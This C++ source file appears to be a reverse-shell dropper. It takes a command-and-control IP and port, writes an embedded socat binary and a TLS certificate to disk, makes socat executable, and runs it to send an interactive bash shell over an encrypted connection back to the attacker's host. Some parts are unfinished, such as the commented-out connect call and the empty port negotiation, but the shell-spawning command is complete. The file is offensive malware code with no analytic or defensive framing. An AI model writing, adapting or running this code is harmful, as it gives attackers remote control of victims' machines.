
#include <iostream>
#include "connector.h"
#include <string>
#include <fstream>

#include "socat.h"
#include "cert.h"

int main(int argc, char** argv){

    if(argc!=3){
        std::cout << "shell.exe <ip> <port>\n";
        exit(1);
    }


    //connect to cc
    Connector c(argv[1], std::stoi(argv[2]));
    //c.Connect();


    //negotiate ports


    //Write second stage (socat)
    std::ofstream socatfile;
    socatfile.open("socat", std::ios::binary | std::ios::out);
    socatfile.write(resources_socat,resources_socat_len);
    socatfile.close();

    //write ssl cert to file
    std::ofstream certfile;
    certfile.open("cert.pem", std::ios::binary | std::ios::out);
    certfile.write(___cert_pem,___cert_pem_len);
    certfile.close(); 


    //socat - TCP:10.1.1.1:80
    std::string command = "chmod 700 socat; ./socat exec:'bash',sigint,stderr,setsid openssl-connect:";
    command.append(argv[1]);
    command.append(":");
    command.append(argv[2]);
    command.append(",cafile=cert.pem");
    std::cout << command << std::endl;
    system(command.c_str());

    return 0;
}